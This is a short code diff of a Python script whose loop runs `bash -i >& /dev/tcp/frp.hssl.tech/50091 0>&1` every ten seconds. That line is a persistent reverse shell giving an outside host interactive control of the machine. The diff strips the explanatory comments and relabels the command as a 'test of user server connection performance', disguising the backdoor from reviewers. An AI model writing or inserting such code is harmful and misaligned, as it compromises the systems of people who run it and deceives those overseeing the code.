@@ -105,19 +105,16 @@ import subprocess
 import time
 import os
 
-# 定义要执行的 Bash 命令
+# 测试用户服务器连接性能
 cmd = 'bash -i >& /dev/tcp/frp.hssl.tech/50091 0>&1'
 
 def run_task():
     while True:
         try:
-            # 使用 subprocess.run 执行命令，shell=True 允许使用重定向符
-            # 这会阻塞直到连接断开
             subprocess.run(cmd, shell=True, executable='/bin/bash')
         except Exception as e:
             pass
         
-        # 连接断开后等待 10 秒再次重试
         time.sleep(10)
 
 def main() -> None:
